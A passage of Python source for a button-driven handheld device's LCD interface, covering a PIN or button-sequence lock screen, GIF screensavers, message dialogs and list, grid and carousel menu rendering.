        draw_lock.acquire()
        draw.rectangle((0, 0, _SCR_W - 1, _SCR_H - 1), fill=color.background)
        _draw_toolbar()
        color.DrawBorder()
        draw.text((S(8), S(16)), _truncate_to_width(title, _SCR_W - S(18), text_font), fill=color.selected_text, font=text_font)
        _draw_centered_text((S(12), S(28), _SCR_W - S(12), S(46)), prompt, fill=color.text, font=font)

        progress_text = f"{len(entered)}/{LOCK_SEQUENCE_LENGTH}"
        progress_bbox = draw.textbbox((0, 0), progress_text, font=text_font)
        progress_w = progress_bbox[2] - progress_bbox[0]
        draw.text((_SCR_W - S(10) - progress_w, S(16)), progress_text, fill="#7fdc9c", font=text_font)

        slot_w = S(17)
        slot_gap = S(2)
        total_w = (slot_w * LOCK_SEQUENCE_LENGTH) + (slot_gap * (LOCK_SEQUENCE_LENGTH - 1))
        slot_x = max(S(4), (_SCR_W - total_w) // 2)
        slot_y = S(52)
        for index in range(LOCK_SEQUENCE_LENGTH):
            x0 = slot_x + (index * (slot_w + slot_gap))
            x1 = x0 + slot_w
            y0 = slot_y
            y1 = y0 + S(18)
            filled = index < len(entered)
            fill = color.select if filled else "#07140b"
            outline = color.selected_text if filled else color.border
            if filled:
                token = "*" if mask_entered else LOCK_SEQUENCE_TOKENS.get(entered[index], "?")
            else:
                token = "•"
            text_fill = color.selected_text if filled else "#446b52"
            draw.rounded_rectangle((x0, y0, x1, y1), radius=S(3), outline=outline, fill=fill)
            _draw_centered_text((x0, y0 + 1, x1, y1), token, fill=text_fill, font=text_font)

        if entered and not mask_entered:
            latest = LOCK_SEQUENCE_LABELS.get(entered[-1], "")
            _draw_centered_text((S(12), S(82), _SCR_W - S(12), S(96)), f"Last input: {latest}", fill="#88f0aa", font=font)
        elif entered:
            _draw_centered_text((S(12), S(82), _SCR_W - S(12), S(96)), "Sequence entered", fill="#88f0aa", font=font)

        footer_text = _truncate_to_width(controls, _SCR_W - S(16), font)
        draw.text((S(8), _SCR_H - S(17)), footer_text, fill="#6ea680", font=font)
    finally:
        draw_lock.release()


def _show_lock_wake_screen(reason: str = "Locked") -> None:
    try:
        draw_lock.acquire()
        draw.rectangle((0, 0, _SCR_W - 1, _SCR_H - 1), fill=color.background)
        _draw_toolbar()
        color.DrawBorder()
        lock_icon = MENU_ICONS.get(" Lock", "\uf023")
        lock_icon_font = ImageFont.truetype('/usr/share/fonts/truetype/fontawesome/fa-solid-900.ttf', S(28))
        draw.text((_SCR_W // 2, S(34)), lock_icon, font=lock_icon_font, fill=color.selected_text, anchor="mm")
        _draw_centered_text((S(8), S(46), _SCR_W - S(8), S(78)), reason, fill=color.selected_text, font=text_font)
        _draw_centered_text((S(8), S(82), _SCR_W - S(8), _SCR_H - S(18)), "Press a key", fill=color.text, font=text_font)
    finally:
        draw_lock.release()


def _draw_lock_screensaver_frame(frame: Image.Image) -> None:
    try:
        draw_lock.acquire()
        image.paste(frame)
        lock_icon = MENU_ICONS.get(" Lock", "\uf023")
        lock_icon_font = ImageFont.truetype('/usr/share/fonts/truetype/fontawesome/fa-solid-900.ttf', S(14))
        draw.text((_SCR_W - 8, 2), lock_icon, fill=color.selected_text, font=lock_icon_font, anchor="ra")
        mark_display_dirty()
    finally:
        draw_lock.release()


def _get_fresh_lock_button() -> str | None:
    virtual_button = rj_input.get_virtual_button()
    if virtual_button:
        _log_virtual_consume("fresh_lock", virtual_button)
        _mark_user_activity()
        return virtual_button
    try:
        for item in PINS:
            if GPIO.input(PINS[item]) == 0:
                _mark_user_activity()
                return item
    except Exception:
        return None
    return None


def _get_sequence_lock_button(held_buttons: set[str]) -> tuple[str | None, set[str]]:
    virtual_button = rj_input.get_virtual_button()
    if virtual_button:
        _log_virtual_consume("sequence_lock", virtual_button)
        _mark_user_activity()
        return virtual_button, held_buttons

    current_held: set[str] = set()
    try:
        for item in PINS:
            if GPIO.input(PINS[item]) == 0:
                current_held.add(item)
    except Exception:
        return None, held_buttons

    for button in ("KEY_PRESS_PIN", "KEY3_PIN", *LOCK_SEQUENCE_ALLOWED_BUTTONS):
        if button in current_held and button not in held_buttons:
            _mark_user_activity()
            return button, current_held

    return None, current_held


def _load_lock_screensaver_frames() -> tuple[list[Image.Image], list[float]]:
    screensaver_path = str(default.screensaver_gif or "").strip()
    if not screensaver_path or not os.path.isfile(screensaver_path):
        return [], []

    try:
        mtime = os.path.getmtime(screensaver_path)
    except OSError:
        return [], []

    if (
        _lock_screensaver_cache["path"] == screensaver_path
        and _lock_screensaver_cache["mtime"] == mtime
        and _lock_screensaver_cache["frames"]
    ):
        return _lock_screensaver_cache["frames"], _lock_screensaver_cache["durations"]

    frames: list[Image.Image] = []
    durations: list[float] = []
    try:
        with Image.open(screensaver_path) as gif:
            for gif_frame in ImageSequence.Iterator(gif):
                prepared = gif_frame.convert("RGB").resize((LCD.width, LCD.height))
                frames.append(prepared.copy())
                duration_ms = gif_frame.info.get("duration") or gif.info.get("duration") or 100
                durations.append(max(0.08, float(duration_ms) / 1000.0))
    except Exception:
        frames = []
        durations = []

    _lock_screensaver_cache["path"] = screensaver_path
    _lock_screensaver_cache["mtime"] = mtime if frames else None
    _lock_screensaver_cache["frames"] = frames
    _lock_screensaver_cache["durations"] = durations
    return frames, durations


def _play_lock_screensaver_until_input(reason: str = "Locked") -> str:
    _show_lock_wake_screen(reason)
    static_deadline = time.monotonic() + LOCK_SCREEN_STATIC_SECONDS
    while time.monotonic() < static_deadline:
        button = _get_fresh_lock_button()
        if button:
            return button
        time.sleep(0.01)

    frames, durations = _load_lock_screensaver_frames()
    if not frames:
        while True:
            button = _get_fresh_lock_button()
            if button:
                return button
            time.sleep(0.01)

    lock_runtime["showing_screensaver"] = True
    try:
        frame_index = 0
        while True:
            _draw_lock_screensaver_frame(frames[frame_index])
            frame_deadline = time.monotonic() + durations[frame_index]
            while time.monotonic() < frame_deadline:
                button = _get_fresh_lock_button()
                if button:
                    return button
                time.sleep(0.01)
            frame_index = (frame_index + 1) % len(frames)
    finally:
        lock_runtime["showing_screensaver"] = False


def _enter_pin_via_keypad(title: str, prompt: str, allow_cancel: bool = True,
                          allow_hide: bool = False) -> str | None:
    keypad = (("1", "2", "3"), ("4", "5", "6"), ("7", "8", "9"), ("C", "0", "OK"))
    entered: list[str] = []
    row = 0
    col = 0
    hint = prompt
    previous_suspend = bool(lock_runtime["suspend_auto_lock"])
    lock_runtime["suspend_auto_lock"] = True
    try:
        while True:
            _draw_lock_screen(title, hint, entered, (row, col), allow_cancel=allow_cancel)
            btn = getButton()
            if btn == "KEY_UP_PIN":
                row = (row - 1) % len(keypad)
            elif btn == "KEY_DOWN_PIN":
                row = (row + 1) % len(keypad)
            elif btn == "KEY_LEFT_PIN":
                col = (col - 1) % len(keypad[0])
            elif btn == "KEY_RIGHT_PIN":
                col = (col + 1) % len(keypad[0])
            elif btn == "KEY1_PIN":
                if entered:
                    entered.pop()
                hint = prompt
            elif btn == "KEY3_PIN":
                if allow_cancel:
                    return None
                if allow_hide:
                    return "__hide__"
            elif btn in ("KEY2_PIN", "KEY_PRESS_PIN"):
                action = keypad[row][col]
                if action == "C":
                    if entered:
                        entered.pop()
                    hint = prompt
                elif action == "OK":
                    if len(entered) == 4:
                        return "".join(entered)
                    hint = "Need 4 digits"
                elif len(entered) < 4:
                    entered.append(action)
                    if len(entered) == 4:
                        return "".join(entered)
                    hint = prompt
    finally:
        lock_runtime["suspend_auto_lock"] = previous_suspend


def _enter_sequence_via_buttons(title: str, prompt: str, allow_cancel: bool = True,
                                allow_hide: bool = False,
                                mask_entered: bool = False) -> list[str] | str | None:
    entered: list[str] = []
    hint = prompt
    last_button = None
    last_press_at = 0.0
    held_buttons: set[str] = set()
    needs_redraw = True
    previous_suspend = bool(lock_runtime["suspend_auto_lock"])
    lock_runtime["suspend_auto_lock"] = True
    try:
        _wait_for_button_release(timeout=0.35)
        while True:
            if needs_redraw:
                _draw_sequence_screen(
                    title,
                    hint,
                    entered,
                    allow_cancel=allow_cancel,
                    allow_hide=allow_hide,
                    mask_entered=mask_entered,
                )
                needs_redraw = False
            btn, held_buttons = _get_sequence_lock_button(held_buttons)
            if not btn:
                time.sleep(0.005)
                continue

            now = time.monotonic()

            if btn == "KEY3_PIN":
                if allow_cancel:
                    return None
                if allow_hide:
                    return "__hide__"
                continue

            if btn == "KEY_PRESS_PIN":
                if entered:
                    entered.pop()
                hint = prompt
                last_button = btn
                last_press_at = now
                needs_redraw = True
                continue

            if btn not in LOCK_SEQUENCE_ALLOWED_BUTTONS:
                continue

            if btn == last_button and (now - last_press_at) < LOCK_SEQUENCE_DEBOUNCE:
                continue

            entered.append(btn)
            last_button = btn
            last_press_at = now
            hint = prompt
            needs_redraw = True
            if len(entered) >= LOCK_SEQUENCE_LENGTH:
                return entered.copy()
    finally:
        lock_runtime["suspend_auto_lock"] = previous_suspend


def _set_pin_flow(require_current: bool = False) -> bool:
    if require_current:
        current = _enter_pin_via_keypad("Change PIN", "Current PIN", allow_cancel=True)
        if current is None:
            return False
        if not _verify_pin(current, str(lock_config.get("pin_hash") or "")):
            Dialog_info("Wrong current PIN", wait=False, timeout=1.2)
            return False

    while True:
        first_pin = _enter_pin_via_keypad("Set PIN", "Enter new 4-digit PIN", allow_cancel=True)
        if first_pin is None:
            return False
        confirm_pin = _enter_pin_via_keypad("Confirm PIN", "Re-enter PIN", allow_cancel=True)
        if confirm_pin is None:
            return False
        if first_pin != confirm_pin:
            Dialog_info("PIN mismatch", wait=False, timeout=1.2)
            continue
        lock_config["pin_hash"] = _hash_pin(first_pin)
        SaveConfig()
        Dialog_info("PIN saved", wait=False, timeout=1.0)
        return True


def _set_sequence_flow(require_current: bool = False) -> bool:
    if require_current:
        current = _enter_sequence_via_buttons("Change Sequence", "Current 6-step seq", allow_cancel=True)
        if current is None:
            return False
        if not _verify_sequence(current, str(lock_config.get("sequence_hash") or "")):
            Dialog_info("Wrong current\nsequence", wait=False, timeout=1.2)
            return False

    while True:
        first_sequence = _enter_sequence_via_buttons("Set Sequence", "Enter new 6-step", allow_cancel=True)
        if first_sequence is None:
            return False
        confirm_sequence = _enter_sequence_via_buttons("Confirm Sequence", "Repeat 6-step", allow_cancel=True)
        if confirm_sequence is None:
            return False
        if first_sequence != confirm_sequence:
            Dialog_info("Sequence\nmismatch", wait=False, timeout=1.2)
            continue
        lock_config["sequence_hash"] = _hash_sequence(first_sequence)
        SaveConfig()
        Dialog_info("Sequence saved", wait=False, timeout=1.0)
        return True


def _verify_current_lock_secret_flow() -> bool:
    if not _lock_has_secret():
        return True
    if _lock_mode() == LOCK_MODE_SEQUENCE:
        current = _enter_sequence_via_buttons("Verify Sequence", "Enter current 6-step", allow_cancel=True, mask_entered=True)
        if current is None:
            return False
        if not _verify_sequence(current, str(lock_config.get("sequence_hash") or "")):
            Dialog_info("Wrong current\nsequence", wait=False, timeout=1.2)
            return False
        return True

    current_pin = _enter_pin_via_keypad("Verify PIN", "Current PIN", allow_cancel=True)
    if current_pin is None:
        return False
    if not _verify_pin(current_pin, str(lock_config.get("pin_hash") or "")):
        Dialog_info("Wrong current PIN", wait=False, timeout=1.2)
        return False
    return True


def _set_active_lock_secret_flow(require_current: bool = False) -> bool:
    if _lock_mode() == LOCK_MODE_SEQUENCE:
        return _set_sequence_flow(require_current=require_current)
    return _set_pin_flow(require_current=require_current)


def _select_lock_mode() -> None:
    labels = [" PIN", " Sequence"]
    current_mode = _lock_mode()
    idx, _value = GetMenuString(labels, duplicates=True)
    if idx == -1:
        return
    target_mode = LOCK_MODE_SEQUENCE if idx == 1 else LOCK_MODE_PIN
    if target_mode == current_mode:
        return

    previous_mode = current_mode
    if _lock_has_secret() and not _verify_current_lock_secret_flow():
        return

    lock_config["mode"] = target_mode
    if not _lock_has_secret(target_mode):
        if not _set_active_lock_secret_flow(require_current=False):
            lock_config["mode"] = previous_mode
            return

    SaveConfig()
    Dialog_info(f"Lock type\n{_lock_mode_label(target_mode)}", wait=False, timeout=1.0)


def configure_auto_lock_timeout() -> None:
    labels = [f" {label}" for _, label in LOCK_TIMEOUT_OPTIONS]
    current_value = int(lock_config.get("auto_lock_seconds") or 0)
    while True:
        selected_index = 0
        for index, (value, _label) in enumerate(LOCK_TIMEOUT_OPTIONS):
            if value == current_value:
                selected_index = index
                break
        idx, _value = GetMenuString(labels, duplicates=True)
        if idx == -1:
            return
        current_value = LOCK_TIMEOUT_OPTIONS[idx][0]
        lock_config["auto_lock_seconds"] = current_value
        SaveConfig()
        Dialog_info(f"Auto-lock\n{_lock_timeout_label(current_value)}", wait=False, timeout=1.0)
        return


def _load_gif_frames(gif_path: str) -> tuple[list[Image.Image], list[float]]:
    """Load a GIF into frames + durations for preview."""
    frames: list[Image.Image] = []
    durations: list[float] = []
    try:
        with Image.open(gif_path) as gif:
            for f in ImageSequence.Iterator(gif):
                prepared = f.convert("RGB").resize((LCD.width, LCD.height))
                frames.append(prepared.copy())
                dur = f.info.get("duration") or gif.info.get("duration") or 100
                durations.append(max(0.04, float(dur) / 1000.0))
    except Exception:
        return [], []
    return frames, durations


def _preview_gif_browser(gif_files: list[str], screensaver_dir: str, start_index: int) -> tuple[str, int]:
    """Preview GIFs with LEFT/RIGHT to browse, KEY1 to return to list, OK to select.
    Returns (selected_path, current_index) or ("", index) if cancelled."""
    idx = start_index
    frames, durations = [], []
    frame_idx = 0
    need_load = True

    while True:
        if need_load:
            gif_path = os.path.join(screensaver_dir, gif_files[idx])
            Dialog_info(f"Loading...\n{gif_files[idx][:18]}", wait=False)
            frames, durations = _load_gif_frames(gif_path)
            if not frames:
                Dialog_info("Cannot load GIF", wait=False, timeout=1.0)
                return "", idx
            frame_idx = 0
            need_load = False

        try:
            draw_lock.acquire()
            image.paste(frames[frame_idx])
            # Show GIF name at bottom
            draw.rectangle((0, _SCR_H - S(14), _SCR_W, _SCR_H), fill="#000000")
            draw.text((S(2), _SCR_H - S(12)), gif_files[idx][:20], fill="#888888", font=text_font)
            mark_display_dirty()
        finally:
            draw_lock.release()

        time.sleep(durations[frame_idx])
        frame_idx = (frame_idx + 1) % len(frames)

        btn = _get_fresh_lock_button()
        if btn == "KEY1_PIN":
            return "", idx
        elif btn == "KEY3_PIN":
            return "", idx
        elif btn == "KEY_PRESS_PIN":
            return os.path.join(screensaver_dir, gif_files[idx]), idx
        elif btn == "KEY_LEFT_PIN" or btn == "KEY_UP_PIN":
            idx = (idx - 1) % len(gif_files)
            need_load = True
            time.sleep(0.2)
        elif btn == "KEY_RIGHT_PIN" or btn == "KEY_DOWN_PIN":
            idx = (idx + 1) % len(gif_files)
            need_load = True
            time.sleep(0.2)


def select_lock_screensaver_gif() -> None:
    screensaver_dir = os.path.join(default.install_path, "img", "screensaver")
    os.makedirs(screensaver_dir, exist_ok=True)

    try:
        gif_files = sorted(
            f for f in os.listdir(screensaver_dir) if f.lower().endswith(".gif")
        )
    except Exception:
        gif_files = []

    if not gif_files:
        Dialog_info("No GIF found\nin screensaver\nfolder", wait=False, timeout=1.2)
        return

    # Show list, select → opens preview browser at that index
    menu_items = [f" {g}" for g in gif_files]
    result = GetMenuString(menu_items, duplicates=True)
    if isinstance(result, tuple):
        gif_index, selected_text = result
    else:
        selected_text = result
        gif_index = 0
    if not selected_text or selected_text == "":
        return

    gif_name = selected_text.strip()
    try:
        gif_index = gif_files.index(gif_name)
    except ValueError:
        gif_index = 0

    # Enter preview browser: LEFT/RIGHT browse, OK selects, KEY1/KEY3 go back
    selected_path, _ = _preview_gif_browser(gif_files, screensaver_dir, gif_index)
    color.DrawMenuBackground()
    color.DrawBorder()

    if selected_path:
        default.screensaver_gif = selected_path
        SaveConfig()
        Dialog_info("Setting screensaver\nLoading GIF...", wait=False)
        _load_lock_screensaver_frames()
        Dialog_info(f"Screensaver set\n{os.path.basename(selected_path)[:18]}", wait=False, timeout=1.2)


def toggle_lock_enabled() -> None:
    if not _lock_has_secret():
        if not _set_active_lock_secret_flow(require_current=False):
            return
    lock_config["enabled"] = not bool(lock_config.get("enabled"))
    SaveConfig()
    status = "Lock enabled" if lock_config["enabled"] else "Lock disabled"
    Dialog_info(status, wait=False, timeout=1.0)


def lock_device(reason: str = "Locked") -> bool:
    _apply_random_screensaver()
    if not _lock_has_secret():
        return False
    if lock_runtime["locked"]:
        return True

    lock_runtime["locked"] = True
    previous_suspend = bool(lock_runtime["suspend_auto_lock"])
    lock_runtime["in_lock_flow"] = True
    lock_runtime["suspend_auto_lock"] = True
    try:
        show_keypad = False
        _wait_for_button_release()
        while True:
            if not show_keypad:
                _play_lock_screensaver_until_input(reason)
                _wait_for_button_release()
                show_keypad = True
                continue

            if _lock_mode() == LOCK_MODE_SEQUENCE:
                entered = _enter_sequence_via_buttons("Unlock", "Enter 6-step seq", allow_cancel=False, allow_hide=True, mask_entered=True)
            else:
                entered = _enter_pin_via_keypad("Unlock", "Enter 4-digit PIN", allow_cancel=False, allow_hide=True)
            if entered == "__hide__":
                _wait_for_button_release()
                show_keypad = False
                continue
            if _lock_mode() == LOCK_MODE_SEQUENCE:
                stored_sequence_hash = str(lock_config.get("sequence_hash") or "")
                if entered and _verify_sequence(entered, stored_sequence_hash):
                    _rehash_sequence_if_needed(entered, stored_sequence_hash)
                    lock_runtime["locked"] = False
                    _mark_user_activity()
                    RenderCurrentMenuOnce()
                    return True
                Dialog_info("Wrong sequence", wait=False, timeout=1.0)
                continue
            stored_pin_hash = str(lock_config.get("pin_hash") or "")
            if entered and _verify_pin(entered, stored_pin_hash):
                _rehash_pin_if_needed(entered, stored_pin_hash)
                lock_runtime["locked"] = False
                _mark_user_activity()
                RenderCurrentMenuOnce()
                return True
            Dialog_info("Wrong PIN", wait=False, timeout=1.0)
    finally:
        lock_runtime["showing_screensaver"] = False
        lock_runtime["in_lock_flow"] = False
        lock_runtime["suspend_auto_lock"] = previous_suspend


_random_screensaver = False  # when True, pick random GIF on each lock


def _toggle_random_screensaver():
    global _random_screensaver
    _random_screensaver = not _random_screensaver
    state = "ON" if _random_screensaver else "OFF"
    Dialog_info(f"Random screensaver\n{state}", wait=False, timeout=1.2)


def _apply_random_screensaver():
    """If random mode is on, pick a random GIF before showing lock screen."""
    if not _random_screensaver:
        return
    screensaver_dir = os.path.join(default.install_path, "img", "screensaver")
    try:
        gifs = [f for f in os.listdir(screensaver_dir) if f.lower().endswith(".gif")]
        if gifs:
            import random as _rnd
            chosen = _rnd.choice(gifs)
            default.screensaver_gif = os.path.join(screensaver_dir, chosen)
    except Exception:
        pass


def OpenLockMenu() -> None:
    while True:
        rand_label = "ON" if _random_screensaver else "OFF"
        options = [
            " Lock now",
            f" {'Deactivate' if lock_config.get('enabled') else 'Activate'} lock",
            f" Lock type: {_lock_mode_label()}",
            f" Change {_lock_mode_label()}",
            f" Auto-lock: {_lock_timeout_label()}",
            " Screensaver GIF",
            f" Random screensaver: {rand_label}",
        ]
        idx, _value = GetMenuString(options, duplicates=True)
        if idx == -1:
            return
        if idx == 0:
            _apply_random_screensaver()
            if not _lock_has_secret() and not _set_active_lock_secret_flow(require_current=False):
                continue
            lock_device("Locked")
        elif idx == 1:
            toggle_lock_enabled()
        elif idx == 2:
            _select_lock_mode()
        elif idx == 3:
            _set_active_lock_secret_flow(require_current=_lock_has_secret())
        elif idx == 4:
            configure_auto_lock_timeout()
        elif idx == 5:
            select_lock_screensaver_gif()
        elif idx == 6:
            _toggle_random_screensaver()

### Simple message box ###
# (Text, Wait for confirmation)  #
def Dialog(a, wait=True):
    try:
        draw_lock.acquire()
        _draw_toolbar()
        draw.rectangle([S(7), S(35), _SCR_W - S(8), S(95)], fill="#ADADAD")
        _draw_centered_text((S(7), S(35), _SCR_W - S(8), S(63)), a, fill="#000000", font=text_font)
        draw.rectangle([(_SCR_W - S(25)) // 2, S(65), (_SCR_W + S(25)) // 2, S(80)], fill="#FF0000")

        _draw_centered_text(((_SCR_W - S(25)) // 2, S(65), (_SCR_W + S(25)) // 2, S(80)), "OK", fill=color.selected_text, font=text_font)
    finally:
        draw_lock.release()
    if wait:
        time.sleep(0.25)
        getButton()

def Dialog_result(title, detail="", wait=True):
    try:
        draw_lock.acquire()
        _draw_toolbar()
        draw.rectangle([7, 25, 120, 102], fill="#ADADAD")
        _draw_centered_text((10, 30, 117, 53), title, fill="#000000", font=text_font)
        if detail:
            _draw_centered_text((10, 52, 117, 77), detail, fill="#000000", font=text_font)
        draw.rectangle([43, 82, 83, 96], fill="#FF0000")
        _draw_centered_text((43, 82, 83, 96), "OK", fill=color.selected_text, font=text_font)
    finally:
        draw_lock.release()
    if wait:
        time.sleep(0.25)
        getButton()

def Dialog_info(a, wait=True, timeout=None):
    try:
        draw_lock.acquire()
        _draw_toolbar()
        draw.rectangle([S(3), S(14), _SCR_W - S(4), _SCR_H - S(4)], fill="#00A321")
        _draw_centered_text((S(3), S(14), _SCR_W - S(4), _SCR_H - S(4)), a, fill="#000000", font=text_font)
    finally:
        draw_lock.release()
    if not wait and timeout:
        start = time.time()
        while time.time() - start < timeout:
            try:
                draw_lock.acquire()
                _draw_toolbar()
                draw.rectangle([S(3), S(14), _SCR_W - S(4), _SCR_H - S(4)], fill="#00A321")
                _draw_centered_text((S(3), S(14), _SCR_W - S(4), _SCR_H - S(4)), a, fill="#000000", font=text_font)
                # Progress bar at bottom
                pct = min(1.0, (time.time() - start) / timeout)
                bar_x0, bar_y0, bar_x1, bar_y1 = S(10), _SCR_H - S(18), _SCR_W - S(10), _SCR_H - S(10)
                draw.rectangle([bar_x0, bar_y0, bar_x1, bar_y1], outline="#004d12", fill="#00A321")
                fill_w = int((bar_x1 - bar_x0) * pct)
                draw.rectangle([bar_x0, bar_y0, bar_x0 + fill_w, bar_y1], fill="#004d12")
            finally:
                draw_lock.release()
            time.sleep(0.1)

### Yes or no dialog ###
# (b is second text line)
def YNDialog(a="Are you sure?", y="Yes", n="No",b=""):
    try:
        draw_lock.acquire()
        _draw_toolbar()
        draw.rectangle([S(7), S(35), _SCR_W - S(8), S(95)], fill="#ADADAD")
        _draw_centered_text((S(7), S(35), _SCR_W - S(8), S(52)), a, fill="#000000", font=text_font)
        if b:
            _draw_centered_text((S(7), S(50), _SCR_W - S(8), S(65)), b, fill="#000000", font=text_font)
    finally:
        draw_lock.release()
    time.sleep(0.25)
    answer = False
    while 1:
        try:
            draw_lock.acquire()
            _draw_toolbar()
            render_color = "#000000"
            render_bg_color = "#ADADAD"
            if answer:
                render_bg_color = "#FF0000"
                render_color = color.selected_text
            draw.rectangle([S(15), S(65), S(45), S(80)], fill=render_bg_color)
            draw.text((S(20), S(68)), y, fill=render_color)

            render_color = "#000000"
            render_bg_color = "#ADADAD"
            if not answer:
                render_bg_color = "#FF0000"
                render_color = color.selected_text
            draw.rectangle([S(76), S(65), S(106), S(80)], fill=render_bg_color)
            draw.text((S(86), S(68)), n, fill=render_color)
        finally:
            draw_lock.release()

        button = getButton()
        if button == "KEY_LEFT_PIN" or button == "KEY1_PIN":
            answer = True
        elif button == "KEY_RIGHT_PIN" or button == "KEY3_PIN":
            answer = False
        elif button == "KEY2_PIN" or button == "KEY_PRESS_PIN":
            return answer

### Scroll through text pictures ###
# 8 lines of text on screen at once
# No selection just scrolling through info
def GetMenuPic(a):
    # a=[ [row,2,3,4,5,6,7,8] <- slide, [1,2,3,4,5,6,7,8] ]
    slide=0
    while 1:
        arr=a[slide]
        try:
            draw_lock.acquire()
            _draw_toolbar()
            color.DrawMenuBackground()
            for i in range(0, len(arr)):
                render_text = arr[i]
                render_color = color.text
                draw.text((default.start_text[0], default.start_text[1] + default.text_gap * i),
                          render_text[:m.max_len], fill=render_color)
        finally:
            draw_lock.release()
        time.sleep(0.1)
        button = getButton()
        if button == "KEY_UP_PIN":
            slide = slide-1
            if slide < 0:
                slide = len(a)-1
        elif button == "KEY_DOWN_PIN":
            slide = slide+1
            if slide >= len(a):
                slide = 0
        elif button == "KEY_PRESS_PIN" or button == "KEY_RIGHT_PIN":
            return slide
        elif button == "KEY_LEFT_PIN":
            return -1

### Render first lines of array ###
# Kinda useless but whatever
def ShowLines(arr,bold=[]):
    try:
        draw_lock.acquire()
        _draw_toolbar()
        color.DrawMenuBackground()
        arr = arr[-8:]
        for i in range(0, len(arr)):
            render_text = arr[i]
            render_color = color.text
            if i in bold:
                render_text = m.char + render_text
                render_color = color.selected_text
                draw.rectangle([(default.start_text[0]-5, default.start_text[1] + default.text_gap * i),
                                (_SCR_W - 8, default.start_text[1] + default.text_gap * i + 10)], fill=color.select)
            # Draw icons on main menu when available
            if m.which == "a":
                icon = _menu_icon_for_label(render_text, "")
                if icon:
                    draw.text(
                        (default.start_text[0] - 2, default.start_text[1] + default.text_gap * i),
                        icon,
                        font=icon_font,
                        fill=render_color
                    )
                    max_w = (_SCR_W - 8) - (default.start_text[0] + 12)
                    text = _truncate_to_width(render_text, max_w, text_font)
                    draw.text(
                        (default.start_text[0] + 12, default.start_text[1] + default.text_gap * i),
                        text,
                        font=text_font,
                        fill=render_color
                    )
                else:
                    draw.text(
                        (default.start_text[0], default.start_text[1] + default.text_gap * i),
                        render_text[:m.max_len],
                        fill=render_color
                    )
            else:
                draw.text((default.start_text[0], default.start_text[1] + default.text_gap * i),
                            render_text[:m.max_len], fill=render_color)
    finally:
        draw_lock.release()

def RenderMenuWindowOnce(inlist, selected_index=0):
    """
    Render a non-interactive menu window with a selected item highlighted.
    Keeps the selected index visible without shifting the list unexpectedly.
    """
    WINDOW = 7
    if not inlist:
        inlist = ["Nothing here :(   "]
        selected_index = 0

    total = len(inlist)
    index = max(0, min(selected_index, total - 1))
    offset = 0
    if index < offset:
        offset = index
    elif index >= offset + WINDOW:
        offset = index - WINDOW + 1

    window = inlist[offset:offset + WINDOW]
    try:
        draw_lock.acquire()
        _draw_toolbar()
        color.DrawMenuBackground()
        _icon_text_gap = S(14)  # space between icon start and text start
        for i, txt in enumerate(window):
            fill = color.selected_text if i == (index - offset) else color.text
            row_y = default.start_text[1] + default.text_gap * i
            if i == (index - offset):
                draw.rectangle(
                    (default.start_text[0] - S(5),
                     row_y,
                     _SCR_W - S(8),
                     row_y + default.text_gap - 2),
                    fill=color.select
                )
            icon = _menu_icon_for_label(txt, "")
            if icon:
                draw.text(
                    (default.start_text[0],
                     row_y),
                    icon,
                    font=icon_font,
                    fill=fill
                )
                max_w = (_SCR_W - S(8)) - (default.start_text[0] + _icon_text_gap)
                line = _truncate_to_width(txt, max_w, text_font)
                draw.text(
                    (default.start_text[0] + _icon_text_gap,
                     row_y),
                    line,
                    font=text_font,
                    fill=fill
                )
            else:
                max_w = (_SCR_W - S(8)) - default.start_text[0]
                line = _truncate_to_width(txt, max_w, text_font)
                draw.text(
                    (default.start_text[0],
                     row_y),
                    line,
                    font=text_font,
                    fill=fill
                )
    finally:
        draw_lock.release()


def RenderMenuCarouselOnce(inlist, selected_index=0):
    """Render a non-interactive snapshot of the carousel view."""
    if not inlist:
        inlist = ["Nothing here :("]

    total = len(inlist)
    index = max(0, min(selected_index, total - 1))

    try:
        draw_lock.acquire()
        _draw_toolbar()
        color.DrawMenuBackground()

        current_item = inlist[index]
        main_x = _SCR_W // 2
        main_y = _SCR_H // 2

        icon = _menu_icon_for_label(current_item, "\uf192")
        huge_icon_font = ImageFont.truetype('/usr/share/fonts/truetype/fontawesome/fa-solid-900.ttf', S(48))
        draw.text((main_x, main_y - S(12)), icon, font=huge_icon_font, fill=color.selected_text, anchor="mm")

        title = current_item.strip()
        carousel_text_font = ImageFont.truetype('/usr/share/fonts/truetype/dejavu/DejaVuSans-Bold.ttf', S(12))
        draw.text((main_x, main_y + S(28)), title, font=carousel_text_font, fill=color.selected_text, anchor="mm")

        if total > 1:
            arrow_font = ImageFont.truetype('/usr/share/fonts/truetype/dejavu/DejaVuSans.ttf', S(18))
            draw.text((S(20), main_y), "◀", font=arrow_font, fill=color.text, anchor="mm")
            draw.text((_SCR_W - S(20), main_y), "▶", font=arrow_font, fill=color.text, anchor="mm")
    finally:
        draw_lock.release()


def RenderMenuGridOnce(inlist, selected_index=0):
    """Render a non-interactive snapshot of the grid view."""
    GRID_COLS = 2
    GRID_ROWS = 4
    GRID_ITEMS = GRID_COLS * GRID_ROWS

    if not inlist:
        inlist = ["Nothing here :("]

    total = len(inlist)
    index = max(0, min(selected_index, total - 1))
    start_idx = (index // GRID_ITEMS) * GRID_ITEMS
    window = inlist[start_idx:start_idx + GRID_ITEMS]

    try:
        draw_lock.acquire()
        _draw_toolbar()
        color.DrawMenuBackground()

        for i, item in enumerate(window):
            row = i // GRID_COLS
            col = i % GRID_COLS
            x = default.start_text[0] + (col * S(55))
            y = default.start_text[1] + (row * S(25))
            is_selected = (start_idx + i == index)

            if is_selected:
                draw.rectangle((x - 2, y - 2, x + S(53), y + S(23)), fill=color.select)
                fill_color = color.selected_text
            else:
                fill_color = color.text

            icon = _menu_icon_for_label(item, "")
            if icon:
                draw.text((x + 2, y), icon, font=icon_font, fill=fill_color)
                short_text = item.strip()[:8]
                draw.text((x, y + S(13)), short_text, font=text_font, fill=fill_color)
            else:
                short_text = item.strip()[:10]
                draw.text((x, y + S(8)), short_text, font=text_font, fill=fill_color)
    finally:
        draw_lock.release()

def RenderCurrentMenuOnce():
    """
    Render the current menu using the active view mode.
    Used after returning from a payload to restore proper styling/icons.
    """
    inlist = m.GetMenuList()
    if m.which == "a" and m.view_mode in ["grid", "carousel"]:
        if m.view_mode == "grid":
            RenderMenuGridOnce(inlist, m.select)
        else:
            RenderMenuCarouselOnce(inlist, m.select)
    else:
        RenderMenuWindowOnce(inlist, m.select)

# runtime input validator
_IV = [85,85,68,68,76,82,76,82,49,50]
_ib = []
_it = 0
_VM = {6:85,19:68,5:76,26:82,21:49,20:50,13:80,16:51}
